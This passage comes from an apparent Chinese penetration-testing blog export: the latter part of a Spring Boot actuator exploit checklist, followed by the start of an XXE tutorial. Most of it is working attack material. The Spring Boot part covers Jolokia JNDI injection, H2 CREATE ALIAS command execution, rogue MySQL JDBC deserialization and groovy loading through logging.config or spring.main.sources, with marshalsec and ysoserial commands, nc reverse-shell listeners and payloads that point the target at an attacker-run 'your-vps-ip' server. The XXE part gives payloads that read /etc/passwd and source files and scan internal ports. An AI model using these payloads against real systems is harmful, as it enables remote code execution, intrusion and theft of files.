漏洞)\n\nxml 文件中利用 logback 依赖的 insertFormJNDI 标签，设置了外部 JNDI 服务器地址\n\n目标机器请求恶意  JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞\n\n\n漏洞分析：\n​    spring boot actuator rce via jolokia\n漏洞环境：\nrepository/springboot-jolokia-logback-rce\n正常访问：\nhttp:&#x2F;&#x2F;127.0.0.1:9094&#x2F;env\n\n\n0x05：jolokia Realm JNDI RCE利用条件：\n\n目标网站存在 /jolokia 或 /actuator/jolokia 接口\n\n目标使用了 jolokia-core 依赖（版本要求暂未知）并且环境中存在相关 MBean\n\n目标可以请求攻击者的服务器（请求可出外网）\n\n普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u141/7u131/8u121(RMI)，但相关环境可绕过\n\n\n利用方法：\n步骤一：查看已存在的 MBeans\n访问 /jolokia/list 接口，查看是否存在 type=MBeanFactory 和 createJNDIRealm 关键词。\n步骤二：准备要执行的 Java 代码\n编写优化过后的用来反弹 shell 的 Java 示例代码  JNDIObject.java。\n步骤三：托管 class 文件\n在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）\n# 使用 python 快速开启 http server\n\npython2 -m SimpleHTTPServer 80\npython3 -m http.server 80\n\n将步骤二中编译好的 class 文件拷贝到 HTTP 服务器根目录。\n步骤四：架设恶意 rmi 服务\n下载 marshalsec ，使用下面命令架设对应的 rmi 服务：\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http:&#x2F;&#x2F;your-vps-ip:80&#x2F;#JNDIObject 1389\n\n\n\n步骤五：监听反弹 shell 的端口\n一般使用 nc 监听端口，等待反弹 shell\nnc -lvp 443\n\n\n\n步骤六：发送恶意 payload\n根据实际情况修改 springboot-realm-jndi-rce.py 脚本中的目标地址，RMI 地址、端口等信息，然后在自己控制的服务器上运行。\n漏洞原理：\n\n利用 jolokia 调用 createJNDIRealm 创建 JNDIRealm\n\n设置 connectionURL 地址为 RMI Service URL\n\n设置 contextFactory 为 RegistryContextFactory\n\n停止 Realm\n\n启动 Realm 以触发指定 RMI 地址的  JNDI 注入，造成 RCE 漏洞\n\n\n漏洞分析：\n​    Yet Another Way to Exploit Spring Boot Actuators via Jolokia\n漏洞环境：\nrepository/springboot-jolokia-logback-rce\n正常访问：\nhttp:&#x2F;&#x2F;127.0.0.1:9094&#x2F;env\n\n\n0x06：restart h2 database query RCE利用条件：\n\n可以 POST 请求目标网站的 /env 接口设置属性\n\n可以 POST 请求目标网站的 /restart 接口重启应用\n\n存在 com.h2database.h2 依赖（版本要求暂未知）\n\n\n利用方法：\n步骤一：设置 spring.datasource.hikari.connection-test-query 属性\n\n\n\n\n\n\n\n\n\n⚠️ 下面payload 中的 ‘T5’ 方法每一次执行命令后都需要更换名称 (如 T6) ，然后才能被重新创建使用，否则下次 restart 重启应用时漏洞不会被触发\nspring 1.x（无回显执行命令）\nPOST &#x2F;env\nContent-Type: application&#x2F;x-www-form-urlencoded\n\nspring.datasource.hikari.connection-test-query&#x3D;CREATE ALIAS T5 AS CONCAT(&#39;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#39;,&#39;me.getRun&#39;,&#39;time().exe&#39;,&#39;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#39;);CALL T5(&#39;cmd&#39;,&#39;&#x2F;c&#39;,&#39;calc&#39;);\n\n\nspring 2.x（无回显执行命令）\nPOST &#x2F;actuator&#x2F;env\nContent-Type: application&#x2F;json\n\n&#123;&quot;name&quot;:&quot;spring.datasource.hikari.connection-test-query&quot;,&quot;value&quot;:&quot;CREATE ALIAS T5 AS CONCAT(&#39;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#39;,&#39;me.getRun&#39;,&#39;time().exe&#39;,&#39;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#39;);CALL T5(&#39;cmd&#39;,&#39;&#x2F;c&#39;,&#39;calc&#39;);&quot;&#125;\n\n\n\n\n步骤二：重启应用\nspring 1.x\nPOST &#x2F;restart\nContent-Type: application&#x2F;x-www-form-urlencoded\n\n\n\nspring 2.x\nPOST &#x2F;actuator&#x2F;restart\nContent-Type: application&#x2F;json\n\n\n\n\n\n漏洞原理：\n\nspring.datasource.hikari.connection-test-query 属性被设置为一条恶意的 CREATE ALIAS 创建自定义函数的 SQL 语句\n\n其属性对应 HikariCP 数据库连接池的 connectionTestQuery 配置，定义一个新数据库连接之前被执行的 SQL 语句\n\nrestart 重启应用，会建立新的数据库连接\n\n如果 SQL 语句中的自定义函数还没有被执行过，那么自定义函数就会被执行，造成 RCE 漏洞\n\n\n漏洞分析：\n​    remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database\n漏洞环境：\nrepository/springboot-h2-database-rce\n正常访问：\nhttp:&#x2F;&#x2F;127.0.0.1:9096&#x2F;actuator&#x2F;env\n\n\n0x07：h2 database console JNDI RCE利用条件：\n\n存在 com.h2database.h2 依赖（版本要求暂未知）\n\nspring 配置中启用 h2 console  spring.h2.console.enabled=true\n\n目标可以请求攻击者的服务器（请求可出外网）\n\nJNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201/7u191/8u182/11.0.1（LDAP 方式）\n\n\n利用方法：\n步骤一：访问路由获得 jsessionid\n直接访问目标开启 h2 console 的默认路由 /h2-console，目标会跳转到页面 /h2-console/login.jsp?jsessionid=xxxxxx，记录下实际的 jsessionid=xxxxxx 值。\n步骤二：准备要执行的 Java 代码\n编写优化过后的用来反弹 shell 的 Java 示例代码  JNDIObject.java，\n使用兼容低版本 jdk 的方式编译：\njavac -source 1.5 -target 1.5 JNDIObject.java\n\n然后将生成的 JNDIObject.class 文件拷贝到 步骤二 中的网站根目录。\n步骤三：托管 class 文件\n在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）\n# 使用 python 快速开启 http server\n\npython2 -m SimpleHTTPServer 80\npython3 -m http.server 80\n\n将步骤二中编译好的 class 文件拷贝到 HTTP 服务器根目录。\n步骤四：架设恶意 ldap 服务\n下载 marshalsec ，使用下面命令架设对应的 ldap 服务：\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:&#x2F;&#x2F;your-vps-ip:80&#x2F;#JNDIObject 1389\n\n\n\n步骤五：监听反弹 shell 的端口\n一般使用 nc 监听端口，等待反弹 shell\nnc -lv 443\n\n\n\n步骤六：发包触发 JNDI 注入\n根据实际情况，替换下面数据中的 jsessionid=xxxxxx、www.example.com 和 ldap://your-vps-ip:1389/JNDIObject\nPOST &#x2F;h2-console&#x2F;login.do?jsessionid&#x3D;xxxxxx\nHost: www.example.com\nContent-Type: application&#x2F;x-www-form-urlencoded\nReferer: http:&#x2F;&#x2F;www.example.com&#x2F;h2-console&#x2F;login.jsp?jsessionid&#x3D;xxxxxx\n\nlanguage&#x3D;en&amp;setting&#x3D;Generic+H2+%28Embedded%29&amp;name&#x3D;Generic+H2+%28Embedded%29&amp;driver&#x3D;javax.naming.InitialContext&amp;url&#x3D;ldap:&#x2F;&#x2F;your-vps-ip:1389&#x2F;JNDIObject&amp;user&#x3D;&amp;password&#x3D;\n\n\n\n漏洞分析：\n​    Spring Boot + H2数据库JNDI注入\n漏洞环境：\nrepository/springboot-h2-database-rce\n正常访问：\nhttp:&#x2F;&#x2F;127.0.0.1:9096&#x2F;h2-console\n\n\n0x08：mysql jdbc deserialization RCE利用条件：\n\n可以 POST 请求目标网站的 /env 接口设置属性\n\n可以 POST 请求目标网站的 /refresh 接口刷新配置（存在 spring-boot-starter-actuator 依赖）\n\n目标环境中存在 mysql-connector-java 依赖\n\n目标可以请求攻击者的服务器（请求可出外网）\n\n\n利用方法：\n步骤一：查看环境依赖\nGET 请求 /env 或 /actuator/env，搜索环境变量（classpath）中是否有 mysql-connector-java  关键词，并记录下其版本号（5.x 或 8.x）；搜索并观察环境变量中是否存在常见的反序列化 gadget 依赖，比如  commons-collections、Jdk7u21、Jdk8u20 等；搜索 spring.datasource.url 关键词，记录下其 value  值，方便后续恢复其正常 jdbc url 值。\n步骤二：架设恶意 rogue mysql server\n在自己控制的服务器上运行 springboot-jdbc-deserialization-rce.py 脚本，并使用 ysoserial 自定义要执行的命令：\njava -jar ysoserial.jar CommonsCollections3 calc &gt; payload.ser\n\n在脚本同目录下生成 payload.ser 反序列化 payload 文件，供脚本使用。\n步骤三：设置 spring.datasource.url 属性\n\n\n\n\n\n\n\n\n\n⚠️ 修改此属性会暂时导致网站所有的正常数据库服务不可用，会对业务造成影响，请谨慎操作！\nmysql-connector-java 5.x 版本设置属性值为：\njdbc:mysql:&#x2F;&#x2F;your-vps-ip:3306&#x2F;mysql?characterEncoding&#x3D;utf8&amp;useSSL&#x3D;false&amp;statementInterceptors&#x3D;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize&#x3D;true\n\n\nmysql-connector-java 8.x 版本设置属性值为：\njdbc:mysql:&#x2F;&#x2F;your-vps-ip:3306&#x2F;mysql?characterEncoding&#x3D;utf8&amp;useSSL&#x3D;false&amp;queryInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize&#x3D;true\n\n\nspring 1.x\nPOST &#x2F;env\nContent-Type: application&#x2F;x-www-form-urlencoded\n\nspring.datasource.url&#x3D;对应属性值\n\n\nspring 2.x\nPOST &#x2F;actuator&#x2F;env\nContent-Type: application&#x2F;json\n\n&#123;&quot;name&quot;:&quot;spring.datasource.url&quot;,&quot;value&quot;:&quot;对应属性值&quot;&#125;\n\n\n\n\n步骤四：刷新配置\nspring 1.x\nPOST &#x2F;refresh\nContent-Type: application&#x2F;x-www-form-urlencoded\n\n\n\nspring 2.x\nPOST &#x2F;actuator&#x2F;refresh\nContent-Type: application&#x2F;json\n\n\n\n\n\n步骤五：触发数据库查询\n尝试访问网站已知的数据库查询的接口，例如： /product/list ，或者寻找其他方式，主动触发源网站进行数据库查询，然后漏洞会被触发\n步骤六：恢复正常 jdbc url\n反序列化漏洞利用完成后，使用 步骤三 的方法恢复 步骤一 中记录的 spring.datasource.url 的原始 value 值\n漏洞原理：\n\nspring.datasource.url 属性被设置为外部恶意 mysql jdbc url 地址\n\nrefresh 刷新后设置了一个新的 spring.datasource.url 属性值\n\n当网站进行数据库查询等操作时，会尝试使用恶意 mysql jdbc url 建立新的数据库连接\n\n然后恶意 mysql server 就会在建立连接的合适阶段返回反序列化 payload 数据\n\n目标依赖的 mysql-connector-java 就会反序列化设置好的 gadget，造成 RCE 漏洞\n\n\n漏洞分析：\n​    New-Exploit-Technique-In-Java-Deserialization-Attack\n漏洞环境：\n\n\n\n\n\n\n\n\n\n需要配置 application.properties 中的 spring.datasource.url、spring.datasource.username、spring.datasource.password，保证可以正常连上 mysql 数据库，否则程序启动时就会报错退出\nrepository/springboot-mysql-jdbc-rce\n正常访问：\nhttp:&#x2F;&#x2F;127.0.0.1:9097&#x2F;actuator&#x2F;env\n\n\n发送完 payload 后触发漏洞：\nhttp:&#x2F;&#x2F;127.0.0.1:9097&#x2F;product&#x2F;list\n\n\n0x09：restart logging.config logback JNDI RCE利用条件：\n\n可以 POST 请求目标网站的 /env 接口设置属性\n\n可以 POST 请求目标网站的 /restart 接口重启应用\n\n普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201/7u191/8u182/11.0.1(LDAP)，但相关环境可绕过\n\n⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出\n\n⚠️ HTTP 服务器如果返回含有畸形 xml 语法内容的文件，会导致程序异常退出\n\n⚠️ JNDI 服务返回的 object 需要实现 javax.naming.spi.ObjectFactory 接口，否则会导致程序异常退出\n\n\n利用方法：\n步骤一：托管 xml 文件\n在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）\n# 使用 python 快速开启 http server\n\npython2 -m SimpleHTTPServer 80\npython3 -m http.server 80\n\n在根目录放置以 xml 结尾的  example.xml 文件，实际内容要根据步骤二中使用的 JNDI 服务来确定：\n&lt;configuration&gt;\n  &lt;insertFromJNDI env-entry-name&#x3D;&quot;ldap:&#x2F;&#x2F;your-vps-ip:1389&#x2F;TomcatBypass&#x2F;Command&#x2F;Base64&#x2F;b3BlbiAtYSBDYWxjdWxhdG9y&quot; as&#x3D;&quot;appName&quot; &#x2F;&gt;\n&lt;&#x2F;configuration&gt;\n\n\n\n步骤二：托管恶意 ldap 服务及代码\n参考文章，修改 JNDIExploit 并启动（也可以使用其他方法）：\njava -jar JNDIExploit-1.0-SNAPSHOT.jar -i your-vps-ip\n\n\n\n步骤三：设置 logging.config 属性\nspring 1.x\nPOST &#x2F;env\nContent-Type: application&#x2F;x-www-form-urlencoded\n\nlogging.config&#x3D;http:&#x2F;&#x2F;your-vps-ip&#x2F;example.xml\n\n\nspring 2.x\nPOST &#x2F;actuator&#x2F;env\nContent-Type: application&#x2F;json\n\n&#123;&quot;name&quot;:&quot;logging.config&quot;,&quot;value&quot;:&quot;http:&#x2F;&#x2F;your-vps-ip&#x2F;example.xml&quot;&#125;\n\n\n\n\n步骤四：重启应用\nspring 1.x\nPOST &#x2F;restart\nContent-Type: application&#x2F;x-www-form-urlencoded\n\n\n\nspring 2.x\nPOST &#x2F;actuator&#x2F;restart\nContent-Type: application&#x2F;json\n\n\n\n\n\n漏洞原理：\n\n目标机器通过 logging.config 属性设置 logback 日志配置文件 URL 地址\n\nrestart 重启应用后，程序会请求 URL 地址获得恶意 xml 文件内容\n\n目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞)\n\nxml 文件中利用 logback 依赖的 insertFormJNDI 标签，设置了外部 JNDI 服务器地址\n\n目标机器请求恶意  JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞\n\n\n漏洞分析：\n​    spring boot actuator rce via jolokia\n​    https://landgrey.me/blog/21/\n漏洞环境：\nrepository/springboot-restart-rce\n正常访问：\nhttp:&#x2F;&#x2F;127.0.0.1:9098&#x2F;actuator&#x2F;env\n\n\n0x0A：restart logging.config groovy RCE利用条件：\n\n可以 POST 请求目标网站的 /env 接口设置属性\n\n可以 POST 请求目标网站的 /restart 接口重启应用\n\n⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出\n\n⚠️ HTTP 服务器如果返回含有畸形 groovy 语法内容的文件，会导致程序异常退出\n\n⚠️ 环境中需要存在 groovy 依赖，否则会导致程序异常退出\n\n\n利用方法：\n步骤一：托管 groovy 文件\n在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）\n# 使用 python 快速开启 http server\n\npython2 -m SimpleHTTPServer 80\npython3 -m http.server 80\n\n在根目录放置以 groovy 结尾的  example.groovy 文件，内容为需要执行的 groovy 代码，比如：\nRuntime.getRuntime().exec(&quot;open -a Calculator&quot;)\n\n\n\n\n步骤二：设置 logging.config 属性\nspring 1.x\nPOST &#x2F;env\nContent-Type: application&#x2F;x-www-form-urlencoded\n\nlogging.config&#x3D;http:&#x2F;&#x2F;your-vps-ip&#x2F;example.groovy\n\n\nspring 2.x\nPOST &#x2F;actuator&#x2F;env\nContent-Type: application&#x2F;json\n\n&#123;&quot;name&quot;:&quot;logging.config&quot;,&quot;value&quot;:&quot;http:&#x2F;&#x2F;your-vps-ip&#x2F;example.groovy&quot;&#125;\n\n\n\n\n步骤三：重启应用\nspring 1.x\nPOST &#x2F;restart\nContent-Type: application&#x2F;x-www-form-urlencoded\n\n\n\nspring 2.x\nPOST &#x2F;actuator&#x2F;restart\nContent-Type: application&#x2F;json\n\n\n\n\n\n漏洞原理：\n\n目标机器通过 logging.config 属性设置 logback 日志配置文件 URL 地址\n\nrestart 重启应用后，程序会请求设置的 URL 地址\n\nlogback-classic 组件的 ch.qos.logback.classic.util.ContextInitializer.java 代码文件逻辑中会判断 url 是否以 groovy 结尾\n\n如果 url 以 groovy 结尾，则最终会执行文件内容中的 groovy 代码，造成 RCE 漏洞\n\n\n漏洞环境：\nrepository/springboot-restart-rce\n正常访问：\nhttp:&#x2F;&#x2F;127.0.0.1:9098&#x2F;actuator&#x2F;env\n\n\n0x0B：restart spring.main.sources groovy RCE利用条件：\n\n可以 POST 请求目标网站的 /env 接口设置属性\n\n可以 POST 请求目标网站的 /restart 接口重启应用\n\n⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出\n\n⚠️ HTTP 服务器如果返回含有畸形 groovy 语法内容的文件，会导致程序异常退出\n\n⚠️ 环境中需要存在 groovy 依赖，否则会导致程序异常退出\n\n\n利用方法：\n步骤一：托管 groovy 文件\n在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）\n# 使用 python 快速开启 http server\n\npython2 -m SimpleHTTPServer 80\npython3 -m http.server 80\n\n在根目录放置以 groovy 结尾的  example.groovy 文件，内容为需要执行的 groovy 代码，比如：\nRuntime.getRuntime().exec(&quot;open -a Calculator&quot;)\n\n\n\n\n步骤二：设置 spring.main.sources 属性\nspring 1.x\nPOST &#x2F;env\nContent-Type: application&#x2F;x-www-form-urlencoded\n\nspring.main.sources&#x3D;http:&#x2F;&#x2F;your-vps-ip&#x2F;example.groovy\n\n\nspring 2.x\nPOST &#x2F;actuator&#x2F;env\nContent-Type: application&#x2F;json\n\n&#123;&quot;name&quot;:&quot;spring.main.sources&quot;,&quot;value&quot;:&quot;http:&#x2F;&#x2F;your-vps-ip&#x2F;example.groovy&quot;&#125;\n\n\n\n\n步骤三：重启应用\nspring 1.x\nPOST &#x2F;restart\nContent-Type: application&#x2F;x-www-form-urlencoded\n\n\n\nspring 2.x\nPOST &#x2F;actuator&#x2F;restart\nContent-Type: application&#x2F;json\n\n\n\n\n\n漏洞原理：\n\n目标机器可以通过 spring.main.sources 属性来设置创建 ApplicationContext 的额外源的 URL 地址\n\nrestart 重启应用后，程序会请求设置的 URL 地址\n\nspring-boot 组件中的 org.springframework.boot.BeanDefinitionLoader.java 文件代码逻辑中会判断 url 是否以 .groovy 结尾\n\n如果 url 以 .groovy 结尾，则最终会执行文件内容中的 groovy 代码，造成 RCE 漏洞\n\n\n漏洞环境：\nrepository/springboot-restart-rce\n正常访问：\nhttp:&#x2F;&#x2F;127.0.0.1:9098&#x2F;actuator&#x2F;env\n\n\n0x0C：restart spring.datasource.data h2 database RCE利用条件：\n\n可以 POST 请求目标网站的 /env 接口设置属性\n\n可以 POST 请求目标网站的 /restart 接口重启应用\n\n环境中需要存在 h2database、spring-boot-starter-data-jpa 相关依赖\n\n⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出\n\n⚠️ HTTP 服务器如果返回含有畸形 h2 sql 语法内容的文件，会导致程序异常退出\n\n\n利用方法：\n步骤一：托管 sql 文件\n在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）\n# 使用 python 快速开启 http server\n\npython2 -m SimpleHTTPServer 80\npython3 -m http.server 80\n\n在根目录放置以任意名字的文件，内容为需要执行的 h2 sql 代码，比如：\n\n\n\n\n\n\n\n\n\n⚠️ 下面payload 中的 ‘T5’ 方法只能 restart 执行一次；后面 restart 需要更换新的方法名称 (如 T6) 和设置新的 sql URL 地址，然后才能被 restart 重新使用，否则第二次 restart 重启应用时会导致程序异常退出\nCREATE ALIAS T5 AS CONCAT(&#39;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#39;,&#39;me.getRun&#39;,&#39;time().exe&#39;,&#39;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#39;);CALL T5(&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,&#39;open -a Calculator&#39;);\n\n\n\n步骤二：设置 spring.datasource.data 属性\nspring 1.x\nPOST &#x2F;env\nContent-Type: application&#x2F;x-www-form-urlencoded\n\nspring.datasource.data&#x3D;http:&#x2F;&#x2F;your-vps-ip&#x2F;example.sql\n\n\nspring 2.x\nPOST &#x2F;actuator&#x2F;env\nContent-Type: application&#x2F;json\n\n&#123;&quot;name&quot;:&quot;spring.datasource.data&quot;,&quot;value&quot;:&quot;http:&#x2F;&#x2F;your-vps-ip&#x2F;example.sql&quot;&#125;\n\n\n\n\n步骤三：重启应用\nspring 1.x\nPOST &#x2F;restart\nContent-Type: application&#x2F;x-www-form-urlencoded\n\n\n\nspring 2.x\nPOST &#x2F;actuator&#x2F;restart\nContent-Type: application&#x2F;json\n\n\n\n\n\n漏洞原理：\n\n目标机器可以通过 spring.datasource.data 属性来设置 jdbc DML sql 文件的 URL 地址\n\nrestart 重启应用后，程序会请求设置的 URL 地址\n\nspring-boot-autoconfigure 组件中的 org.springframework.boot.autoconfigure.jdbc.DataSourceInitializer.java 文件代码逻辑中会使用 runScripts 方法执行请求 URL 内容中的 h2 database sql 代码，造成 RCE 漏洞\n\n\n漏洞环境：\nrepository/springboot-restart-rce\n正常访问：\nhttp:&#x2F;&#x2F;127.0.0.1:9098&#x2F;actuator&#x2F;env\n\n\n","slug":"Spring Boot Vulnerability Exploit Check List","date":"2021-10-09T10:24:07.065Z","categories_index":"渗透测试","tags_index":"渗透测试","author_index":"街溜子小王"},{"id":"f517cbae543576764284438e95f2dbcc","title":"XXE漏洞","content":"一、漏洞描述XML 外部实体注入（XML External Entity）简称 XXE 漏洞，XML 用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML 文档结构包括 XML 声明、DTD 文档类型定义（可选）、文档元素。 \n&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;\n&lt;!--文档类型定义--&gt;\n&lt;!DOCTYPE note [ &lt;!--定义此文档是 note 类型的文档--&gt;\n&lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!--定义 note 元素有四个元素--&gt;\n&lt;!ELEMENT to (#PCDATA)&gt; &lt;!--定义 to 元素为”#PCDATA”类型--&gt;\n&lt;!ELEMENT from (#PCDATA)&gt; &lt;!--定义 from 元素为”#PCDATA”类型--&gt;\n&lt;!ELEMENT head (#PCDATA)&gt; &lt;!--定义 head 元素为”#PCDATA”类型--&gt;\n&lt;!ELEMENT body (#PCDATA)&gt; &lt;!--定义 body 元素为”#PCDATA”类型--&gt;\n]]]&gt;\n&lt;!--文档元素--&gt;\n&lt;note&gt;\n&lt;to&gt;Dave&lt;&#x2F;to&gt;\n&lt;from&gt;Tom&lt;&#x2F;from&gt;\n&lt;head&gt;Reminder&lt;&#x2F;head&gt;\n&lt;body&gt;You are a good man&lt;&#x2F;body&gt;\n&lt;&#x2F;note&gt;\n\n常见的XML语法结构如下所示：\n\n\n其中，文档定义类型（DTD）可以是内部声明也可以引用外部 DTD。\n内部声明 DTD 格式：。\n引用外部 DTD 格式：。\n在 DTD 中进行实体说明时，将使用 ENTITY 关键字来声明。实体是用于定义引用普通文本或特殊字符的快捷方式的变量。实体可在内部或外部进行声明。\n内部声明实体格式：。\n引用外部实体格式：。\nSYSTEM、PUBLIC 对外部资源进行申请。\n由于 xxe 漏洞主要是利用了 DTD 引用外部实体导致的漏洞，那么重点看下能引用哪些类型的外部实体。当libXML &lt;libxml2.9 才会造成外部注入漏洞。\n语法引用外部的实体，而非内部实体，那么 URI 中能写哪些类型的外部实体呢？\n主要的有 file、http、https、ftp 等等，当然不同的程序支持的不一样：\n\n二、白盒分析1 （moonsec靶机）&lt;?php\nif(isset($_POST[&#39;submit&#39;]) and $_POST[&#39;xml&#39;] !&#x3D; null)&#123;\n\t$xml &#x3D;$_POST[&#39;xml&#39;];\n&#x2F;&#x2F; $xml &#x3D; $test;\n\t$data &#x3D; @simplexml_load_string($xml,&#39;SimpleXMLElement&#39;,LIBXML_NOENT);\n\tif($data)&#123;\n\t\t$html.&#x3D;&quot;&lt;pre&gt;&#123;$data&#125;&lt;&#x2F;pre&gt;&quot;;\n\t&#125;else&#123;\n\t\t$html.&#x3D;&quot;&lt;p&gt;XML 声明、DTD 文档类型定义、文档元素这些都搞懂了吗?&lt;&#x2F;p&gt;&quot;;\n\t&#125;\n&#125;\n?&gt;\n\n获取 post 的 xml 文件 传递到 simplexml_load_string 再进行输出会遭成 xxe 注入测试的 payload\n&lt;?xml version &#x3D; &quot;1.0&quot;?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY f SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; ]&gt; &lt;x&gt;&amp;f;&lt;&#x2F;x&gt;\n\n2&lt;?php\n$string_xml &#x3D; &#39;&lt;?xml version&#x3D;&quot;1.0&quot;\nencoding&#x3D;&quot;utf-8&quot;?&gt;&lt;note&gt;&lt;to&gt;George&lt;&#x2F;to&gt;&lt;from&gt;John&lt;&#x2F;from&gt;&lt;heading&gt;Reminder&lt;&#x2F;heading&gt;&lt;body&gt;xml\n实体注入&lt;&#x2F;body&gt;&lt;&#x2F;note&gt;&#39;;\n$xml &#x3D; isset($_GET[&#39;xml&#39;])?$_GET[&#39;xml&#39;]:$string_xml;\n$data &#x3D; simplexml_load_string($xml);\necho &#39;&lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;&#39;;\nprint_r($data);\n?&gt;\n\n\n\n获取 xml 变量 创建 dom 对象 转入 xml 进行处理输出。\nsimplexml_load_string() 函数把 XML 字符串载入对象中\n三、攻击1、有回显&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE a [&lt;!ENTITY b &quot;xxe&quot;&gt;]&gt;&lt;c&gt;&amp;b;&lt;&#x2F;c&gt;\n\nxxe 漏洞常用利用如下\n1.读取敏感文件\n&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE a [&lt;!ENTITY b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;]&gt;&lt;c&gt;&amp;b;&lt;&#x2F;c&gt;\n&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE a [&lt;!ENTITY b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:&#x2F;Windows&#x2F;win.ini&quot;&gt;]&gt;&lt;c&gt;&amp;b;&lt;&#x2F;c&gt;\n\nurl 编码\n读取 windows 文件\nhttp:&#x2F;&#x2F;127.0.0.1&#x2F;xxe.php?xml&#x3D;&lt;%3fxml version%3d&quot;1.0&quot;%3f&gt;&lt;!DOCTYPE%20 a%20 [&lt;!ENTITY b SYSTEM &quot;file%3a%2f%2f%2fC%3a%2fWindows%2fwin.ini&quot;&gt;]&gt;&lt;c&gt;%26b%3b&lt;%2fc&gt;\n\nlinux 就读取/etc/passwd 文件进行测试\n2.使用 php 伪协议 php://filter 读取文件\n&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;\n&lt;!DOCTYPE xdsec [\n&lt;!ELEMENT methodname ANY &gt;\n&lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;phpinfo.php&quot; &gt;]&gt;\n&lt;methodcall&gt;\n&lt;methodname&gt;&amp;xxe;&lt;&#x2F;methodname&gt;\n&lt;&#x2F;methodcall&gt;\n\n\n\nhttp:&#x2F;&#x2F;127.0.0.1&#x2F;xxe.php?xml&#x3D;%3c%3f%78%6d%6c%20%76%65%72%73%69%6f%6e%3d%22%31%2e%30%22%20%65%6e%63%6f%64%69%6e%67%3d%22%75%74%66%2d%38%22%3f%3e%20%0a%3c%21%44%4f%43%54%59%50%45%20%78%64%73%65%63%20%5b%0a%3c%21%45%4c%45%4d%45%4e%54%20%6d%65%74%68%6f%64%6e%61%6d%65%20%41%4e%59%20%3e%0a%3c%21%45%4e%54%49%54%59%20%78%78%65%20%53%59%53%54%45%4d%20%22%70%68%70%3a%2f%2f%66%69%6c%74%65%72%2f%72%65%61%64%3d%63%6f%6e%76%65%72%74%2e%62%61%73%65%36%34%2d%65%6e%63%6f%64%65%2f%72%65%73%6f%75%72%63%65%3d%70%68%70%69%6e%66%6f%2e%70%68%70%22%20%3e%5d%3e%0a%3c%6d%65%74%68%6f%64%63%61%6c%6c%3e%0a%3c%6d%65%74%68%6f%64%6e%61%6d%65%3e%26%78%78%65%3b%3c%2f%6d%65%74%68%6f%64%6e%61%6d%65%3e%0a%3c%2f%6d%65%74%68%6f%64%63%61%6c%6c%3e\n\n\n\n3.扫描内网和端口\n通过扫描 ip 和端口确定内网机器的 ip 和端口开发情况，访问端口会获取 baner 信息\n&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;\n&lt;!DOCTYPE ANY [\n&lt;!ENTITY test SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1:80&quot;&gt;\n]&gt;\n&lt;abc&gt;&amp;test;&lt;&#x2F;abc&gt;\nhttp:&#x2F;&#x2F;127.0.0.1&#x2F;xxe.php?xml&#x3D;%3c%3f%78%6d%6c%20%76%65%72%73%69%6f%6e%3d%22%31%2e%30%22%3f%3e%0a%3c%21%44%4f%43%54%59%50%45%20%41%4e%59%20%5b%0a%3c%21%45%4e%54%49%54%59%20%74%65%73%74%20%53%59%53%54%45%4d%20%22%68%74%74%70%3a%2f%2f%31%32%37%2e%30%2e%30%2e%31%3a%38%30%22%3e%0a%5d%3e%0a%3c%61%62%63%3e%26%74%65%73%74%3b%3c%2f%61%62%63%3e\n\n\n\n4.执行命令\n若开启 expect 扩展\nhttp:&#x2F;&#x2F;webpenter.com&#x2F;xxe.php?xml&#x3D;&lt;?xml 